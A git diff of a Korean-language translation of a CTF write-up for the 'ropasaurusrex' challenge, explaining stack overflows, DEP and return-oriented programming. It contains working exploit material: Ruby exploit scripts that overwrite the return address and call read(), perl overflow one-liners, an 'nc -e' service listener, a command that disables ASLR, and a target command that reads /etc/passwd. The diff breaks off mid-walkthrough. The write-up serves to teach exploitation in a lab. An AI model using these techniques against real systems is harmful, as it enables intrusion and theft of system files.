@@ -2,32 +2,32 @@
 |         ...          | (높은 주소)
 +----------------------+
 
-+----------------------+ &lt;-- &#39;A&#39;의 스택 프레임 시작
-|   [return address]   | &lt;-- &#39;A&#39;를 호출한 주소
++----------------------+ &lt;-- 'A'의 스택 프레임 시작
+|   [return address]   | &lt;-- 'A'를 호출한 주소
 +----------------------+
 |   [frame pointer]    |
 +----------------------+
 |   [local variables]  |
 +----------------------+
 
-+----------------------+ &lt;-- &#39;B&#39;의 스택 프레임 시작
++----------------------+ &lt;-- 'B'의 스택 프레임 시작
 |         2 (parameter)|
 +----------------------+
 |         1 (parameter)|
 +----------------------+
-|   [return address]   | &lt;-- &#39;B&#39;가 반환되는 주소
+|   [return address]   | &lt;-- 'B'가 반환되는 주소
 +----------------------+
 |   [frame pointer]    |
 +----------------------+
 |   [local variables]  |
 +----------------------+
 
-+----------------------+ &lt;-- &#39;C&#39;의 스택 프레임 시작
++----------------------+ &lt;-- 'C'의 스택 프레임 시작
 |         4 (parameter)|
 +----------------------+
 |         3 (parameter)|
 +----------------------+
-|   [return address]   | &lt;-- &#39;C&#39;가 반환되는 주소
+|   [return address]   | &lt;-- 'C'가 반환되는 주소
 +----------------------+
 
 +----------------------+
@@ -59,7 +59,7 @@
 |                      |
 +----------------------+
           ...            (낮은 주소)
-</code></pre></div><p>변수 <code>buf</code>의 길이는 16바이트다. 만약 프로그램이 buf의 17번째 바이트(즉, <code>buf[16]</code>)에 쓰려고 하면 어떻게 될까? 에, 반환 주소의 마지막 바이트&mdash;<a href="https://en.wikipedia.org/wiki/Endianness">리틀 엔디언</a>&mdash;에 쓰게 된다. 18번째 바이트는 반환 주소의 끝에서 두 번째 바이트에 쓰게 되고, 그런 방식이다. 이렇게 우리는 우리가 원하는 곳으로 반환 주소를 바꿀 수 있다. <em>원하는 곳 어디든</em>. 함수가 반환하면, 어디로 가겠는가? 뭐, 아마 그건 가야 할 곳으로 가고 있다고 생각할 것이다&mdash;완벽한 세계에서는, 그럴 것이다&mdash;하지만 아니다! 이 경우에는, 공격자가 원하는 곳 어디로든지 갈 수 있다. 공격자가 <a href="https://en.wikipedia.org/wiki/Zero_page">0</a>으로 점프하라고 하면, 0으로 점프하고 크래시를 일으킬 것이다. 공격자가 <code>0x41414141</code>(&quot;AAAA&rdquo;)로 점프하라고 하면, 그리로 점프하고 아마도 크래시를 일으킬 것이다. 공격자가 스택으로 점프하라고 하면&hellip; 음, 이건 좀 복잡해진다&hellip;<h2><a id="dep"></a>DEP</h2><p>전통적으로, 공격자는 스택에 코드를 넣을 수 있었기 때문에 (어찌 되었건, 코드는 그저 바이트 뭉치일 뿐이다!), 반환 주소가 스택을 가리키도록 바꿔 왔다. 하지만 그건 시스템을 공격하는 일반적이고 쉬운 방법이었기 때문에, OS 회사의 나쁜 자식들이 (농담이다, 난 당신들을 사랑한다 :)) 데이터 실행 방지, DEP를 통해 이를 멈췄다. DEP가 적용된 어떤 시스템이건, 스택에서 코드를 실행할 수 없다&mdash;좀 더 일반적으로, 공격자가 쓸(write) 수 있는 어떤 곳에서도&mdash;그렇지 않으면, 크래시를 일으킨다.<p>그러면 코드를 실행할 권한도 없이 도대체 어떻게 코드를 실행할 수 있나!?<p>음, 이제 그걸 할 것이다. 하지만 먼저, 이 문제가 사용하는 취약점을 보자!<h2><a id="the-vulnerability"></a>취약점</h2><p>여기 IDA에서 갓 뽑은 취약한 함수다:<div class="highlight"><pre><code class="language-text" data-lang="text">.text:080483F4vulnerable_function proc near
+</code></pre></div><p>변수 <code>buf</code>의 길이는 16바이트다. 만약 프로그램이 buf의 17번째 바이트(즉, <code>buf[16]</code>)에 쓰려고 하면 어떻게 될까? 에, 반환 주소의 마지막 바이트&mdash;<a href="https://en.wikipedia.org/wiki/Endianness">리틀 엔디언</a>&mdash;에 쓰게 된다. 18번째 바이트는 반환 주소의 끝에서 두 번째 바이트에 쓰게 되고, 그런 방식이다. 이렇게 우리는 우리가 원하는 곳으로 반환 주소를 바꿀 수 있다. <em>원하는 곳 어디든</em>. 함수가 반환하면, 어디로 가겠는가? 뭐, 아마 그건 가야 할 곳으로 가고 있다고 생각할 것이다&mdash;완벽한 세계에서는, 그럴 것이다&mdash;하지만 아니다! 이 경우에는, 공격자가 원하는 곳 어디로든지 갈 수 있다. 공격자가 <a href="https://en.wikipedia.org/wiki/Zero_page">0</a>으로 점프하라고 하면, 0으로 점프하고 크래시를 일으킬 것이다. 공격자가 <code>0x41414141</code>(&quot;AAAA&rdquo;)로 점프하라고 하면, 그리로 점프하고 아마도 크래시를 일으킬 것이다. 공격자가 스택으로 점프하라고 하면&hellip; 음, 이건 좀 복잡해진다&hellip;<h2><a id="dep"></a>DEP</h2><p>전통적으로, 공격자는 스택에 코드를 넣을 수 있었기 때문에 (어찌 되었건, 코드는 그저 바이트 뭉치일 뿐이다!), 반환 주소가 스택을 가리키도록 바꿔 왔다. 하지만 그건 시스템을 공격하는 일반적이고 쉬운 방법이었기 때문에, OS 회사의 나쁜 자식들이 (농담이다, 난 당신들을 사랑한다 :)) 데이터 실행 방지, DEP를 통해 이를 멈췄다. DEP가 적용된 어떤 시스템이건, 스택에서 코드를 실행할 수 없다&mdash;좀 더 일반적으로, 공격자가 쓸(write) 수 있는 어떤 곳에서도&mdash;그렇지 않으면, 크래시를 일으킨다.<p>그러면 코드를 실행할 권한도 없이 도대체 어떻게 코드를 실행할 수 있나!?<p>음, 이제 그걸 할 것이다. 하지만 먼저, 이 문제가 사용하는 취약점을 보자!<h2><a id="the-vulnerability"></a>취약점</h2><p>여기 IDA에서 갓 뽑은 취약한 함수다:<div class="highlight"><pre><code class="language-" data-lang="">.text:080483F4vulnerable_function proc near
 .text:080483F4
 .text:080483F4buf             = byte ptr -88h
 .text:080483F4
@@ -80,43 +80,45 @@
   <span class="k">return</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">256</span><span class="p">);</span>
 <span class="p">}</span>
 </code></pre></div><p>256바이트를 읽어 136바이트 버퍼에 넣는다. 즐거웠어요 스택 씨!<p>이걸 실행함으로써 쉽게 확인할 수 있다. &#39;A&rsquo; 뭉치를 파이프로 넣고, 어떻게 되는지 보자:<div class="highlight"><pre><code class="language-sh" data-lang="sh">ron@debian-x86 ~ <span class="nv">$ </span><span class="nb">ulimit</span> -c unlimited
-ron@debian-x86 ~ <span class="nv">$ </span>perl -e <span class="s2">&quot;print &#39;A&#39;x300&quot;</span> <span class="p">|</span> ./ropasaurusrex
+ron@debian-x86 ~ <span class="nv">$ </span>perl -e <span class="s2">"print 'A'x300"</span> | ./ropasaurusrex
 Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
 ron@debian-x86 ~ <span class="nv">$ </span>gdb ./ropasaurusrex core
-<span class="o">[</span>...<span class="o">]</span>
+<span class="o">[</span>...]
 Program terminated with signal 11, Segmentation fault.
 <span class="c">#0  0x41414141 in ?? ()</span>
 <span class="o">(</span>gdb<span class="o">)</span>
-</code></pre></div><p>간단히 말해서, 이건 우리가 반환 주소를 글자 A 4개(<code>0x41414141</code>=&ldquo;AAAA&rdquo;)로 덮어썼다는 말이다.<p>이제, 정확히 뭘 조종하고 있는 건지 알아내기 위한 좋은 방법이 있고 나쁜 방법이 있다. 나는 나쁜 방법을 썼다. 내 버퍼 끝에 &ldquo;BBBB&quot;를 넣고 <code>0x42424242</code>(&quot;BBBB&rdquo;)에서 크래시를 일으킬 때까지 &#39;A&#39;를 지웠다.<div class="highlight"><pre><code class="language-sh" data-lang="sh">ron@debian-x86 ~ <span class="nv">$ </span>perl -e <span class="s2">&quot;print &#39;A&#39;x140;print &#39;BBBB&#39;&quot;</span> <span class="p">|</span> ./ropasaurusrex
+</code></pre></div><p>간단히 말해서, 이건 우리가 반환 주소를 글자 A 4개(<code>0x41414141</code>=&ldquo;AAAA&rdquo;)로 덮어썼다는 말이다.<p>이제, 정확히 뭘 조종하고 있는 건지 알아내기 위한 좋은 방법이 있고 나쁜 방법이 있다. 나는 나쁜 방법을 썼다. 내 버퍼 끝에 &ldquo;BBBB&quot;를 넣고 <code>0x42424242</code>(&quot;BBBB&rdquo;)에서 크래시를 일으킬 때까지 &#39;A&#39;를 지웠다.<div class="highlight"><pre><code class="language-sh" data-lang="sh">ron@debian-x86 ~ <span class="nv">$ </span>perl -e <span class="s2">"print 'A'x140;print 'BBBB'"</span> | ./ropasaurusrex
 Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
 ron@debian-x86 ~ <span class="nv">$ </span>gdb ./ropasaurusrex core
 <span class="c">#0  0x42424242 in ?? ()</span>
-</code></pre></div><p>이걸 좀 더 &ldquo;잘&rdquo; (내 뜻은, 더 천천히) 하고 싶으면, Metasploit의 <a href="https://github.com/rapid7/metasploit-framework/blob/master/tools/pattern_create.rb">pattern_create.rb</a>와 <a href="https://github.com/rapid7/metasploit-framework/blob/master/tools/pattern_offset.rb">pattern_offset.rb</a>를 보라. 이건 추측이 느린 작업일 때 굉장히 좋지만, 이 문제의 경우에는 추측과 확인이 빨라 나는 쓰지 않았다.<h2><a id="starting-to-write-an-exploit"></a>익스플로잇 제작 시작하기</h2><p>가장 먼저 해야 할 일은 <code>ropasaurusrex</code>를 네트워크 서비스로 실행시키는 것이다. CTF 주최자들은 <a href="https://en.wikipedia.org/wiki/Xinetd">xinetd</a>를 썼지만, 우리는 (우리의 목적에) 그만큼 좋은 <a href="https://en.wikipedia.org/wiki/Netcat">netcat</a>을 쓸 것이다.<div class="highlight"><pre><code class="language-sh" data-lang="sh"><span class="nv">$ </span><span class="k">while</span> <span class="nb">true</span><span class="p">;</span> <span class="k">do</span> nc -vv -l -p <span class="m">4444</span> -e ./ropasaurusrex<span class="p">;</span> <span class="k">done</span>
-listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4444</span> ...
-</code></pre></div><p>이제부터 우리는 <code>localhost:4444</code>를 익스플로잇 대상으로 쓸 수도 있고 실제 서버에도 작용하는지 테스트 할 수도 있다.<p>ASLR을 끄고 싶다면:<div class="highlight"><pre><code class="language-sh" data-lang="sh"><span class="nv">$ </span>sudo sysctl -w kernel.randomize_va_space<span class="o">=</span>0
-</code></pre></div><p>이건 당신의 시스템을 익스플로잇 당하기 쉽게 만든다는 것을 알아둬라. 그러니 이걸 실험실 환경 바깥에서 하는 건 추천하지 않는다!<p>초반 익스플로잇을 위한 루비 코드다:<div class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="err">$</span> <span class="n">cat</span> <span class="o">.</span><span class="n">/sploit</span><span class="o">.</span><span class="n">rb</span>
-<span class="nb">require</span> <span class="s1">&#39;socket&#39;</span>
+</code></pre></div><p>이걸 좀 더 &ldquo;잘&rdquo; (내 뜻은, 더 천천히) 하고 싶으면, Metasploit의 <a href="https://github.com/rapid7/metasploit-framework/blob/master/tools/pattern_create.rb">pattern_create.rb</a>와 <a href="https://github.com/rapid7/metasploit-framework/blob/master/tools/pattern_offset.rb">pattern_offset.rb</a>를 보라. 이건 추측이 느린 작업일 때 굉장히 좋지만, 이 문제의 경우에는 추측과 확인이 빨라 나는 쓰지 않았다.<h2><a id="starting-to-write-an-exploit"></a>익스플로잇 제작 시작하기</h2><p>가장 먼저 해야 할 일은 <code>ropasaurusrex</code>를 네트워크 서비스로 실행시키는 것이다. CTF 주최자들은 <a href="https://en.wikipedia.org/wiki/Xinetd">xinetd</a>를 썼지만, 우리는 (우리의 목적에) 그만큼 좋은 <a href="https://en.wikipedia.org/wiki/Netcat">netcat</a>을 쓸 것이다.<div class="highlight"><pre><code class="language-sh" data-lang="sh"><span class="gp">$ </span><span class="k">while </span><span class="nb">true</span>; <span class="k">do </span>nc -vv -l -p 4444 -e ./ropasaurusrex; <span class="k">done
+</span>listening on <span class="o">[</span>any] 4444 ...
+</code></pre></div><p>이제부터 우리는 <code>localhost:4444</code>를 익스플로잇 대상으로 쓸 수도 있고 실제 서버에도 작용하는지 테스트 할 수도 있다.<p>ASLR을 끄고 싶다면:<div class="highlight"><pre><code class="language-sh" data-lang="sh"><span class="gp">$ </span>sudo sysctl -w kernel.randomize_va_space<span class="o">=</span>0
+</code></pre></div><p>이건 당신의 시스템을 익스플로잇 당하기 쉽게 만든다는 것을 알아둬라. 그러니 이걸 실험실 환경 바깥에서 하는 건 추천하지 않는다!<p>초반 익스플로잇을 위한 루비 코드다:<div class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="err">$</span> <span class="n">cat</span> <span class="p">.</span><span class="nf">/</span><span class="n">sploit</span><span class="p">.</span><span class="nf">rb</span>
+<span class="nb">require</span> <span class="s1">'socket'</span>
 
-<span class="n">s</span> <span class="o">=</span> <span class="no">TCPSocket</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s2">&quot;localhost&quot;</span><span class="p">,</span> <span class="mi">4444</span><span class="p">)</span>
+<span class="n">s</span> <span class="o">=</span> <span class="no">TCPSocket</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="s2">"localhost"</span><span class="p">,</span> <span class="mi">4444</span><span class="p">)</span>
 
 <span class="c1"># Generate the payload</span>
-<span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">140</span> <span class="o">+</span>
-  <span class="o">[</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s2">"A"</span><span class="o">*</span><span class="mi">140</span> <span class="o">+</span>
+  <span class="p">[</span>
     <span class="mh">0x42424242</span><span class="p">,</span>
-  <span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;I*&quot;</span><span class="p">)</span> <span class="c1"># Convert a series of &#39;ints&#39; to a string</span>
+  <span class="p">].</span><span class="nf">pack</span><span class="p">(</span><span class="s2">"I*"</span><span class="p">)</span> <span class="c1"># Convert a series of 'ints' to a string</span>
 
-<span class="n">s</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-</code></pre></div><p><code>ruby ./sploit.rb</code>를 통해 실행시키면 서비스 크래시를 볼 것이다:<div class="highlight"><pre><code class="language-sh" data-lang="sh">connect to <span class="o">[</span>127.0.0.1<span class="o">]</span> from debian-x86.skullseclabs.org <span class="o">[</span>127.0.0.1<span class="o">]</span> 53451
+<span class="n">s</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+</code></pre></div><p><code>ruby ./sploit.rb</code>를 통해 실행시키면 서비스 크래시를 볼 것이다:<div class="highlight"><pre><code class="language-sh" data-lang="sh">connect to <span class="o">[</span>127.0.0.1] from debian-x86.skullseclabs.org <span class="o">[</span>127.0.0.1] 53451
 Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
 </code></pre></div><p>그리고 gdb를 통해 이게 알맞은 위치에서 크래시를 일으킨다는 걸 확인할 수 있다:<div class="highlight"><pre><code class="language-sh" data-lang="sh">gdb --quiet ./ropasaurusrex core
-<span class="o">[</span>...<span class="o">]</span>
+<span class="o">[</span>...]
 Program terminated with signal 11, Segmentation fault.
 <span class="c">#0  0x42424242 in ?? ()</span>
-</code></pre></div><p>이게 익스플로잇의 시작이다!<h2><a id="how-to-waste-time-with-aslr"></a>어떻게 ASLR로 시간을 낭비하는가</h2><p>이 섹션을 &#39;시간 낭비&#39;라고 하는 이유는, 내가 ASLR이 적용되어 있다는 것을&mdash;그 때&mdash;깨닫지 못했기 때문이다. 하지만 ASLR이 적용되어 있지 않다고 가정하는 것은 이 문제를 훨씬 교육하기 좋은 퍼즐로 만들어준다. 그러니 지금은 ASLR에 대해 걱정하지 말자&mdash;실제로, ASLR을 <em>정의</em>조차 하지 말자. 다음 섹션에 나올 것이다.<p>좋다, 이제 우린 뭘 하고 싶은가? 우린 취약한 프로세스를 가지고 있고, <a href="https://en.wikipedia.org/wiki/C_standard_library">libc</a> 공유 라이브러리도 있다. 다음 단계는 뭔가?<p>음, 궁극적인 목표는 시스템 명령어를 실행하는 것이다. <a href="https://en.wikipedia.org/wiki/Standard_streams">stdin과 stdout</a>이 모두 <a href="https://en.wikipedia.org/wiki/Network_socket">소켓</a>에 연결되어 있으므로, 예를 들어 우리가 <code>system(&quot;cat /etc/passwd&quot;)</code>를 실행할 수 있다면, 끝난 거다! 이걸 할 수 있으면, 우린 어떤 명령어든 실행할 수 있다. 하지만 그건 두 가지 조건을 포함한다:<ol><li><code>cat /etc/passwd</code> 문자열을 메모리 어딘가에 넣기<li><code>system()</code> 함수 실행하기</ol><h3><a id="getting-the-string-into-memory"></a>메모리에 문자열 넣기</h3><p>메모리에 문자열을 넣는 건 실제로 두 소단계를 포함한다:<ol><li>우리가 쓸 수 있는 메모리를 찾기<li>그 메모리에 쓸 수 있는 함수 찾기</ol><p>무리한 요구라고? 그렇지 않다! 중요한 것부터 하자. 우리가 읽고 쓸 수 있는 메모리를 찾아보자! 가장 명백한 곳은 <a href="https://en.wikipedia.org/wiki/Data_segment">.data</a> 섹션이다:<div class="highlight"><pre><code class="language-sh" data-lang="sh">ron@debian-x86 ~ <span class="nv">$ </span>objdump -x ropasaurusrex  <span class="p">|</span> grep -A1 <span class="s1">&#39;\.data&#39;</span>
- <span class="m">23</span> .data         <span class="m">00000008</span>  <span class="m">08049620</span>  <span class="m">08049620</span>  <span class="m">00000620</span>  2**2
+</code></pre></div><p>이게 익스플로잇의 시작이다!<h2><a id="how-to-waste-time-with-aslr"></a>어떻게 ASLR로 시간을 낭비하는가</h2><p>이 섹션을 &#39;시간 낭비&#39;라고 하는 이유는, 내가 ASLR이 적용되어 있다는 것을&mdash;그 때&mdash;깨닫지 못했기 때문이다. 하지만 ASLR이 적용되어 있지 않다고 가정하는 것은 이 문제를 훨씬 교육하기 좋은 퍼즐로 만들어준다. 그러니 지금은 ASLR에 대해 걱정하지 말자&mdash;실제로, ASLR을 <em>정의</em>조차 하지 말자. 다음 섹션에 나올 것이다.<p>좋다, 이제 우린 뭘 하고 싶은가? 우린 취약한 프로세스를 가지고 있고, <a href="https://en.wikipedia.org/wiki/C_standard_library">libc</a> 공유 라이브러리도 있다. 다음 단계는 뭔가?<p>음, 궁극적인 목표는 시스템 명령어를 실행하는 것이다. <a href="https://en.wikipedia.org/wiki/Standard_streams">stdin과 stdout</a>이 모두 <a href="https://en.wikipedia.org/wiki/Network_socket">소켓</a>에 연결되어 있으므로, 예를 들어 우리가 <code>system(&quot;cat /etc/passwd&quot;)</code>를 실행할 수 있다면, 끝난 거다! 이걸 할 수 있으면, 우린 어떤 명령어든 실행할 수 있다. 하지만 그건 두 가지 조건을 포함한다:<ol><li><code>cat /etc/passwd</code> 문자열을 메모리 어딘가에 넣기<li><code>system()</code> 함수 실행하기</ol><h3><a id="getting-the-string-into-memory"></a>메모리에 문자열 넣기</h3><p>메모리에 문자열을 넣는 건 실제로 두 소단계를 포함한다:<ol><li>우리가 쓸 수 있는 메모리를 찾기<li>그 메모리에 쓸 수 있는 함수 찾기</ol><p>무리한 요구라고? 그렇지 않다! 중요한 것부터 하자. 우리가 읽고 쓸 수 있는 메모리를 찾아보자! 가장 명백한 곳은 <a href="https://en.wikipedia.org/wiki/Data_segment">.data</a> 섹션이다:<div class="highlight"><pre><code class="language-sh" data-lang="sh">ron@debian-x86 ~ <span class="nv">$ </span>objdump -x ropasaurusrex  | grep -A1 <span class="s1">'\.data'</span>
+ 23 .data         00000008  08049620  08049620  00000620  2<span class="k">**</span>2
                    CONTENTS, ALLOC, LOAD, DATA
-</code></pre></div><p>오 이런, .data는 8바이트밖에 되지 않는다. 이건 부족하다! 이론적으로, 충분히 길고, 쓸 수 있으며(writable), 사용되지 않은 주소는 우리 목적에 충분하다. <code>objdump -x</code>의 출력에서, 나는 딱 알맞아 보이는 .dynamic 섹션을 발견했다.<div class="highlight"><pre><code class="language-sh" data-lang="sh"> <span class="m">20</span> .dynamic      000000d0  <span class="m">08049530</span>  <span class="m">08049530</span>  <span class="m">00000530</span>  2**2
+
+</code></pre></div><p>오 이런, .data는 8바이트밖에 되지 않는다. 이건 부족하다! 이론적으로, 충분히 길고, 쓸 수 있으며(writable), 사용되지 않은 주소는 우리 목적에 충분하다. <code>objdump -x</code>의 출력에서, 나는 딱 알맞아 보이는 .dynamic 섹션을 발견했다.<div class="highlight"><pre><code class="language-sh" data-lang="sh">
+ 20 .dynamic      000000d0  08049530  08049530  00000530  2<span class="k">**</span>2
                    CONTENTS, ALLOC, LOAD, DATA
 </code></pre></div><p>.dynamic 섹션은 동적 링크 정보를 담고 있다. 우리가 하려는 것에 그건 필요 없으니 주소 <code>0x08049530</code>을 덮어쓰기로 하자.<p>다음 단계는 주소 <code>0x08049530</code>에 명령어 문자열을 쓸 수 있는 함수를 찾는 것이다. 가장 쓰기 편리한 함수는 라이브러리보다 실행 파일 자체에 들어 있는 것인데, 실행 파일 안의 함수는 시스템에 따라 변하지 않기 때문이다. 우리에게 무엇이 있는지 살펴보자:<div class="highlight"><pre><code class="language-sh" data-lang="sh">ron@debian-x86 ~ <span class="nv">$ </span>objdump -R ropasaurusrex
 
@@ -124,36 +126,36 @@ ropasaurusrex:     file format elf32-i386
 
 DYNAMIC RELOCATION RECORDS
 OFFSET   TYPE              VALUE
-<span class="m">08049600</span> R_386_GLOB_DAT    __gmon_start__
-<span class="m">08049610</span> R_386_JUMP_SLOT   __gmon_start__
-<span class="m">08049614</span> R_386_JUMP_SLOT   write
-<span class="m">08049618</span> R_386_JUMP_SLOT   __libc_start_main
+08049600 R_386_GLOB_DAT    __gmon_start__
+08049610 R_386_JUMP_SLOT   __gmon_start__
+08049614 R_386_JUMP_SLOT   write
+08049618 R_386_JUMP_SLOT   __libc_start_main
 0804961c R_386_JUMP_SLOT   <span class="nb">read</span>
-</code></pre></div><p>즉시 사용 가능한 <code>read()</code>와 <code>write()</code>를 찾았다. 이건 유용하다! <code>read()</code> 함수는 소켓에서 데이터를 읽을 것이고 그걸 메모리에 쓸 것이다. 프로토타입은 이럴 것이다:<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">ssize_t</span> <span class="nf">read</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">count</span><span class="p">);</span>
+</code></pre></div><p>즉시 사용 가능한 <code>read()</code>와 <code>write()</code>를 찾았다. 이건 유용하다! <code>read()</code> 함수는 소켓에서 데이터를 읽을 것이고 그걸 메모리에 쓸 것이다. 프로토타입은 이럴 것이다:<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">ssize_t</span> <span class="n">read</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">count</span><span class="p">);</span>
 </code></pre></div><p>당신이 <code>read()</code> 함수에 진입했을 때, 이런 스택을 원할 것이다:<div class="highlight"><pre><code class="language-text" data-lang="text">+----------------------+
 |         ...          | - 상관 없다, 다른 함수들이 여기 올 것이다.
 +----------------------+
 
 +----------------------+ &lt;-- read()의 스택 프레임 시작
-|     size_t count     | - count, strlen(&quot;cat /etc/passwd&quot;)
+|     size_t count     | - count, strlen("cat /etc/passwd")
 +----------------------+
 |      void *buf       | - 쓸 수 있는(writable) memory, 0x08049530
 +----------------------+
-|        int fd        | - &#39;stdin&#39; (0)이어야 한다.
+|        int fd        | - 'stdin' (0)이어야 한다.
 +----------------------+
-|   [return address]   | - &#39;read&#39;가 반환할 곳
+|   [return address]   | - 'read'가 반환할 곳
 +----------------------+
 
 +----------------------+
 |         ...          | - 상관 없다, read()가 지역 변수를 위해 사용할 것이다.
 +----------------------+
-</code></pre></div><p>익스플로잇을 이렇게 업데이트 하자 (설명은 주석에 있다):<div class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="err">$</span> <span class="n">cat</span> <span class="n">sploit</span><span class="o">.</span><span class="n">rb</span>
-<span class="nb">require</span> <span class="s1">&#39;socket&#39;</span>
+</code></pre></div><p>익스플로잇을 이렇게 업데이트 하자 (설명은 주석에 있다):<div class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="err">$</span> <span class="n">cat</span> <span class="n">sploit</span><span class="p">.</span><span class="nf">rb</span>
+<span class="nb">require</span> <span class="s1">'socket'</span>
 
-<span class="n">s</span> <span class="o">=</span> <span class="no">TCPSocket</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s2">&quot;localhost&quot;</span><span class="p">,</span> <span class="mi">4444</span><span class="p">)</span>
+<span class="n">s</span> <span class="o">=</span> <span class="no">TCPSocket</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="s2">"localhost"</span><span class="p">,</span> <span class="mi">4444</span><span class="p">)</span>
 
-<span class="c1"># The command we&#39;ll run</span>
-<span class="n">cmd</span> <span class="o">=</span> <span class="no">ARGV</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\0</span><span class="s2">&quot;</span>
+<span class="c1"># The command we'll run</span>
+<span class="n">cmd</span> <span class="o">=</span> <span class="no">ARGV</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s2">"</span><span class="se">\0</span><span class="s2">"</span>
 
 <span class="c1"># From objdump -x</span>
 <span class="n">buf</span> <span class="o">=</span> <span class="mh">0x08049530</span>
@@ -164,44 +166,44 @@ OFFSET   TYPE              VALUE
 <span class="n">write_addr</span> <span class="o">=</span> <span class="mh">0x0804830C</span>
 
 <span class="c1"># Generate the payload</span>
-<span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">140</span> <span class="o">+</span>
-  <span class="o">[</span>
-    <span class="n">cmd</span><span class="o">.</span><span class="n">length</span><span class="p">,</span> <span class="c1"># number of bytes</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s2">"A"</span><span class="o">*</span><span class="mi">140</span> <span class="o">+</span>
+  <span class="p">[</span>
+    <span class="n">cmd</span><span class="p">.</span><span class="nf">length</span><span class="p">,</span> <span class="c1"># number of bytes</span>
     <span class="n">buf</span><span class="p">,</span>        <span class="c1"># writable memory</span>
     <span class="mi">0</span><span class="p">,</span>          <span class="c1"># stdin</span>
-    <span class="mh">0x43434343</span><span class="p">,</span> <span class="c1"># read&#39;s return address</span>
+    <span class="mh">0x43434343</span><span class="p">,</span> <span class="c1"># read's return address</span>
 
     <span class="n">read_addr</span> <span class="c1"># Overwrite the original return</span>
-  <span class="o">].</span><span class="n">reverse</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;I*&quot;</span><span class="p">)</span> <span class="c1"># Convert a series of &#39;ints&#39; to a string</span>
+  <span class="p">].</span><span class="nf">reverse</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="s2">"I*"</span><span class="p">)</span> <span class="c1"># Convert a series of 'ints' to a string</span>
 
-<span class="c1"># Write the &#39;exploit&#39; payload</span>
-<span class="n">s</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="c1"># Write the 'exploit' payload</span>
+<span class="n">s</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 
 <span class="c1"># When our payload calls read() the first time, this is read</span>
-<span class="n">s</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
 
 <span class="c1"># Clean up</span>
-<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-</code></pre></div><p>공격 대상에 실행해 보자:<div class="highlight"><pre><code class="language-sh" data-lang="sh">ron@debian-x86 ~ <span class="nv">$ </span>ruby sploit.rb <span class="s2">&quot;cat /etc/passwd&quot;</span>
-</code></pre></div><p>그리고 크래시를 일으키는 걸 확인해라:<div class="highlight"><pre><code class="language-sh" data-lang="sh">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4444</span> ...
-connect to <span class="o">[</span>127.0.0.1<span class="o">]</span> from debian-x86.skullseclabs.org <span class="o">[</span>127.0.0.1<span class="o">]</span> 53456
+<span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+</code></pre></div><p>공격 대상에 실행해 보자:<div class="highlight"><pre><code class="language-sh" data-lang="sh">ron@debian-x86 ~ <span class="nv">$ </span>ruby sploit.rb <span class="s2">"cat /etc/passwd"</span>
+</code></pre></div><p>그리고 크래시를 일으키는 걸 확인해라:<div class="highlight"><pre><code class="language-sh" data-lang="sh">listening on <span class="o">[</span>any] 4444 ...
+connect to <span class="o">[</span>127.0.0.1] from debian-x86.skullseclabs.org <span class="o">[</span>127.0.0.1] 53456
 Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
-</code></pre></div><p>그게 <code>read()</code>의 반환 주소(<code>0x43434343</code>)에서 크래시를 일으켰고 명령어를 메모리 <code>0x08049530</code>에 썼다는 걸 확인해라:<div class="highlight"><pre><code class="language-sh" data-lang="sh"><span class="nv">$ </span>gdb --quiet ./ropasaurusrex core
-<span class="o">[</span>...<span class="o">]</span>
